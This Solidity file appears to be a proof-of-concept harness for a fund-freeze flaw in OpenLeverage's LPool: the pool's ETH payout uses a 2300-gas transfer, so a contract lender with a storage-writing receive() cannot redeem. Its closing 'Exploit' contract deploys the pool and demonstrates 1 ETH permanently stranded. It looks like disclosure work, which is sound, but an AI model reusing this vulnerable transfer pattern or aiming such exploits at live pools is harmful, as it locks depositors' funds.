        (vars.mathErr, vars.accountTokensNew) = addUInt(accountTokens[minter], vars.mintTokens);
        require(vars.mathErr == MathError.NO_ERROR, "calc tokens new ailed");

        totalSupply = vars.totalSupplyNew;
        accountTokens[minter] = vars.accountTokensNew;

        emit Mint(minter, vars.actualMintAmount, vars.mintTokens);
        emit Transfer(address(this), minter, vars.mintTokens);

        return vars.actualMintAmount;
    }

    struct RedeemLocalVars {
        MathError mathErr;
        uint exchangeRateMantissa;
        uint redeemTokens;
        uint redeemAmount;
        uint totalSupplyNew;
        uint accountTokensNew;
    }

    function redeemFresh(address payable redeemer, uint redeemTokensIn, uint redeemAmountIn) internal sameBlock {
        require(redeemTokensIn == 0 || redeemAmountIn == 0, "one be zero");

        RedeemLocalVars memory vars;

        (vars.mathErr, vars.exchangeRateMantissa) = exchangeRateStoredInternal();
        require(vars.mathErr == MathError.NO_ERROR, 'calc exchangerate error');

        if (redeemTokensIn > 0) {
            vars.redeemTokens = redeemTokensIn;
            (vars.mathErr, vars.redeemAmount) = mulScalarTruncate(Exp({mantissa : vars.exchangeRateMantissa}), redeemTokensIn);
            require(vars.mathErr == MathError.NO_ERROR, 'calc redeem amount error');
        } else {
            (vars.mathErr, vars.redeemTokens) = divScalarByExpTruncate(redeemAmountIn, Exp({mantissa : vars.exchangeRateMantissa}));
            require(vars.mathErr == MathError.NO_ERROR, 'calc redeem tokens error');
            vars.redeemAmount = redeemAmountIn;
        }

        (ControllerInterface(controller)).redeemAllowed(redeemer, vars.redeemTokens);

        (vars.mathErr, vars.totalSupplyNew) = subUInt(totalSupply, vars.redeemTokens);
        require(vars.mathErr == MathError.NO_ERROR, 'calc supply new error');

        (vars.mathErr, vars.accountTokensNew) = subUInt(accountTokens[redeemer], vars.redeemTokens);
        require(vars.mathErr == MathError.NO_ERROR, 'calc token new error');
        require(getCashPrior() >= vars.redeemAmount, 'cash < redeem');

        totalSupply = vars.totalSupplyNew;
        accountTokens[redeemer] = vars.accountTokensNew;

        doTransferOut(redeemer, vars.redeemAmount, true);

        emit Transfer(redeemer, address(this), vars.redeemTokens);
        emit Redeem(redeemer, vars.redeemAmount, vars.redeemTokens);
    }

    struct BorrowLocalVars {
        MathError mathErr;
        uint accountBorrows;
        uint accountBorrowsNew;
        uint totalBorrowsNew;
    }

    function borrowFresh(address payable borrower, address payable payee, uint borrowAmount) internal sameBlock {
        (ControllerInterface(controller)).borrowAllowed(borrower, payee, borrowAmount);

        require(getCashPrior() >= borrowAmount, 'cash<borrow');

        BorrowLocalVars memory vars;

        (vars.mathErr, vars.accountBorrows) = borrowBalanceStoredInternal(borrower);
        require(vars.mathErr == MathError.NO_ERROR, 'calc acc borrows error');

        (vars.mathErr, vars.accountBorrowsNew) = addUInt(vars.accountBorrows, borrowAmount);
        require(vars.mathErr == MathError.NO_ERROR, 'calc acc borrows error');

        (vars.mathErr, vars.totalBorrowsNew) = addUInt(totalBorrows, borrowAmount);
        require(vars.mathErr == MathError.NO_ERROR, 'calc total borrows error');

        accountBorrows[borrower].principal = vars.accountBorrowsNew;
        accountBorrows[borrower].interestIndex = borrowIndex;
        totalBorrows = vars.totalBorrowsNew;

        doTransferOut(payee, borrowAmount, false);

        emit Borrow(borrower, payee, borrowAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);
    }

    struct RepayBorrowLocalVars {
        MathError mathErr;
        uint repayAmount;
        uint borrowerIndex;
        uint accountBorrows;
        uint accountBorrowsNew;
        uint totalBorrowsNew;
        uint actualRepayAmount;
        uint badDebtsAmount;
    }

    function repayBorrowFresh(address payer, address borrower, uint repayAmount, bool isEnd) internal sameBlock returns (uint) {
        (ControllerInterface(controller)).repayBorrowAllowed(payer, borrower, repayAmount, isEnd);

        RepayBorrowLocalVars memory vars;

        vars.borrowerIndex = accountBorrows[borrower].interestIndex;

        (vars.mathErr, vars.accountBorrows) = borrowBalanceStoredInternal(borrower);
        require(vars.mathErr == MathError.NO_ERROR, 'calc acc borrow error');

        if (repayAmount == uint(- 1)) {
            vars.repayAmount = vars.accountBorrows;
        } else {
            vars.repayAmount = repayAmount;
        }
        vars.actualRepayAmount = doTransferIn(payer, vars.repayAmount, false);

        if (isEnd && vars.accountBorrows > vars.actualRepayAmount) {
            vars.badDebtsAmount = vars.accountBorrows - vars.actualRepayAmount;
        }

        if (vars.accountBorrows < vars.actualRepayAmount) {
            require(vars.actualRepayAmount.mul(1e18).div(vars.accountBorrows) <= 105e16, 'repay more than 5%');
            vars.accountBorrowsNew = 0;
        } else {
            if (isEnd) {
                vars.accountBorrowsNew = 0;
            } else {
                vars.accountBorrowsNew = vars.accountBorrows - vars.actualRepayAmount;
            }
        }
        if (vars.actualRepayAmount > totalBorrows) {
            vars.totalBorrowsNew = 0;
        } else {
            if (isEnd) {
                vars.totalBorrowsNew = totalBorrows.sub(vars.accountBorrows);
            } else {
                vars.totalBorrowsNew = totalBorrows - vars.actualRepayAmount;
            }
        }

        accountBorrows[borrower].principal = vars.accountBorrowsNew;
        accountBorrows[borrower].interestIndex = borrowIndex;
        totalBorrows = vars.totalBorrowsNew;

        emit RepayBorrow(payer, borrower, vars.actualRepayAmount, vars.badDebtsAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);

        return vars.actualRepayAmount;
    }

    function setController(address newController) external override onlyAdmin {
        require(address(0) != newController, "0x");
        address oldController = controller;
        controller = newController;
        emit NewController(oldController, newController);
    }

    function setBorrowCapFactorMantissa(uint newBorrowCapFactorMantissa) external override onlyAdmin {
        require(newBorrowCapFactorMantissa <= 1e18, 'Factor too large');
        uint oldBorrowCapFactorMantissa = borrowCapFactorMantissa;
        borrowCapFactorMantissa = newBorrowCapFactorMantissa;
        emit NewBorrowCapFactorMantissa(oldBorrowCapFactorMantissa, borrowCapFactorMantissa);
    }

    function setInterestParams(uint baseRatePerBlock_, uint multiplierPerBlock_, uint jumpMultiplierPerBlock_, uint kink_) external override onlyAdmin {
        if (baseRatePerBlock != 0) {
            accrueInterest();
        }
        require(baseRatePerBlock_ < 1e13, 'Base rate too large');
        baseRatePerBlock = baseRatePerBlock_;
        require(multiplierPerBlock_ < 1e13, 'Mul rate too large');
        multiplierPerBlock = multiplierPerBlock_;
        require(jumpMultiplierPerBlock_ < 1e13, 'Jump rate too large');
        jumpMultiplierPerBlock = jumpMultiplierPerBlock_;
        require(kink_ <= 1e18, 'Kline too large');
        kink = kink_;
        emit NewInterestParam(baseRatePerBlock_, multiplierPerBlock_, jumpMultiplierPerBlock_, kink_);
    }

    function setReserveFactor(uint newReserveFactorMantissa) external override onlyAdmin {
        require(newReserveFactorMantissa <= 1e18, 'Factor too large');
        accrueInterest();
        uint oldReserveFactorMantissa = reserveFactorMantissa;
        reserveFactorMantissa = newReserveFactorMantissa;
        emit NewReserveFactor(oldReserveFactorMantissa, newReserveFactorMantissa);
    }

    function addReserves(uint addAmount) external override nonReentrant {
        accrueInterest();
        uint totalReservesNew;
        uint actualAddAmount = doTransferIn(msg.sender, addAmount, true);
        totalReservesNew = totalReserves.add(actualAddAmount);
        totalReserves = totalReservesNew;
        emit ReservesAdded(msg.sender, actualAddAmount, totalReservesNew);
    }

    function reduceReserves(address payable to, uint reduceAmount) external override nonReentrant onlyAdmin {
        accrueInterest();
        uint totalReservesNew;
        totalReservesNew = totalReserves.sub(reduceAmount);
        totalReserves = totalReservesNew;
        doTransferOut(to, reduceAmount, true);
        emit ReservesReduced(to, reduceAmount, totalReservesNew);
    }

    modifier sameBlock() {
        require(accrualBlockNumber == getBlockNumber(), 'not same block');
        _;
    }
}

// ----------------------------------------------------------------------------
// OpenLeverage — LPoolDelegator (VERBATIM audited proxy)
// ----------------------------------------------------------------------------
contract LPoolDelegator is DelegatorInterface, Adminable {

    constructor() {
        admin = msg.sender;
    }
    function initialize(address underlying_,
        bool isWethPool_,
        address contoller_,
        uint256 baseRatePerYear,
        uint256 multiplierPerYear,
        uint256 jumpMultiplierPerYear,
        uint256 kink_,
        uint initialExchangeRateMantissa_,
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        address payable admin_,
        address implementation_) external onlyAdmin {
        require(implementation == address(0), "initialize once");
        delegateTo(implementation_, abi.encodeWithSignature("initialize(address,bool,address,uint256,uint256,uint256,uint256,uint256,string,string,uint8)",
            underlying_,
            isWethPool_,
            contoller_,
            baseRatePerYear,
            multiplierPerYear,
            jumpMultiplierPerYear,
            kink_,
            initialExchangeRateMantissa_,
            name_,
            symbol_,
            decimals_));

        implementation = implementation_;

        admin = admin_;
    }
    function setImplementation(address implementation_) public override onlyAdmin {
        address oldImplementation = implementation;
        implementation = implementation_;
        emit NewImplementation(oldImplementation, implementation);
    }
}

// ----------------------------------------------------------------------------
// OpenLeverage test WETH (verbatim). A truly-external opaque token: the pool
// treats it as the wrapped-native underlying via deposit()/withdraw().
// ----------------------------------------------------------------------------
contract WETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8  public decimals = 18;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);

    mapping(address => uint)                       public  balanceOf;
    mapping(address => mapping(address => uint))  public  allowance;

    receive() external payable {
        deposit();
    }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad,'no balance');
        balanceOf[msg.sender] -= wad;
        msg.sender.transfer(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function mint(address to, uint256 amount) public {
        balanceOf[to] = balanceOf[to]+(amount);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
    public
    returns (bool)
    {
        require(balanceOf[src] >= wad,"balanceOf[src] < wad");

        if (src != msg.sender && allowance[src][msg.sender] != uint(- 1)) {
            require(allowance[src][msg.sender] >= wad,"allowance[src][msg.sender] < wad");
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}

// ----------------------------------------------------------------------------
// Minimal external permission gate (permits mint/redeem). NOT the vulnerable
// contract — LPool casts the controller address to ControllerInterface.
// ----------------------------------------------------------------------------
contract MockController is ControllerInterface {
    function mintAllowed(address, uint) external override {}
    function transferAllowed(address, address, uint) external override {}
    function redeemAllowed(address, uint) external override {}
    function borrowAllowed(address, address, uint) external override {}
    function repayBorrowAllowed(address, address, uint, bool) external override {}
}

interface ILPool {
    function mintEth() external payable;
    function redeem(uint256) external;
    function balanceOf(address) external view returns (uint256);
}

// A contract lender whose ETH-receiving path fits the 2300-gas transfer stipend
// (empty receive): the control case — it can redeem.
contract CheapLender {
    function depositEth(address pool) external payable {
        ILPool(pool).mintEth{value: msg.value}();
    }

    function redeemAll(address pool) external {
        ILPool(pool).redeem(ILPool(pool).balanceOf(address(this)));
    }

    receive() external payable {}
}

// An ordinary contract lender (multisig / vault / router) whose receive does a
// single SSTORE (~20k gas): far above the 2300 stipend. LPool.doTransferOut
// permanently locks it out of its own deposit.
contract ContractLender {
    uint256 public received;

    function depositEth(address pool) external payable {
        ILPool(pool).mintEth{value: msg.value}();
    }

    function tryRedeemAll(address pool) external returns (bool ok) {
        uint256 bal = ILPool(pool).balanceOf(address(this));
        (ok, ) = pool.call(abi.encodeWithSelector(ILPool.redeem.selector, bal));
    }

    receive() external payable {
        received += msg.value; // > 2300 gas: cannot run inside transfer's stipend
    }
}

// ----------------------------------------------------------------------------
// Exploit — deploys the real LPool through the real delegator and demonstrates
// the permanent fund freeze. Measured harm: 1 ETH of WETH stranded in the pool.
// ----------------------------------------------------------------------------
contract Exploit {
    WETH public weth;
    MockController public controller;
    LPool public impl;
    address public pool; // LPoolDelegator proxy (address(this) inside LPool)
    CheapLender public cheap;
    ContractLender public hungry;

    constructor() {
        weth = new WETH(); // nonce 1
        controller = new MockController(); // nonce 2
        impl = new LPool(); // nonce 3

        LPoolDelegator delegator = new LPoolDelegator(); // nonce 4 — the pool
        delegator.initialize(
            address(weth),
            true, // isWethPool_ -> vulnerable native-transfer branch
            address(controller),
            0, 0, 0, 0,
            1e18, // initialExchangeRateMantissa_ (1:1)
            "OpenLeverage ETH",
            "lETH",
            18,
            payable(address(this)),
            address(impl)
        );
        pool = address(delegator);

        cheap = new CheapLender(); // nonce 5
        hungry = new ContractLender(); // nonce 6
    }

    // Receives 2 ETH (attackValueWei) and distributes 1 ETH to each lender.
    function run() external payable {
        // Both contract lenders supply 1 ETH into the WETH money market.
        cheap.depositEth{value: 1 ether}(pool);
        hungry.depositEth{value: 1 ether}(pool);

        // Control: the empty-receive lender redeems its full 1 ETH.
        cheap.redeemAll(pool);

        // Harm: the ordinary contract lender's redeem is reverted by
        // LPool.doTransferOut's `to.transfer(amount)` (2300-gas stipend).
        bool ok = hungry.tryRedeemAll(pool);
        require(!ok, "redeem should revert for a >2300-gas contract lender");

        // The hungry lender received nothing and still holds unredeemable
        // lTokens; its 1 ETH is now permanently frozen in the pool. The
        // profitReceiver (the pool) measures exactly that 1 ETH of WETH.
        require(hungry.received() == 0, "receive must never have run");
        require(ILPool(pool).balanceOf(address(hungry)) == 1e18, "hungry still holds unredeemable lTokens");
        require(weth.balanceOf(pool) == 1 ether, "1 ETH must be frozen in the pool");
    }

    receive() external payable {}
}
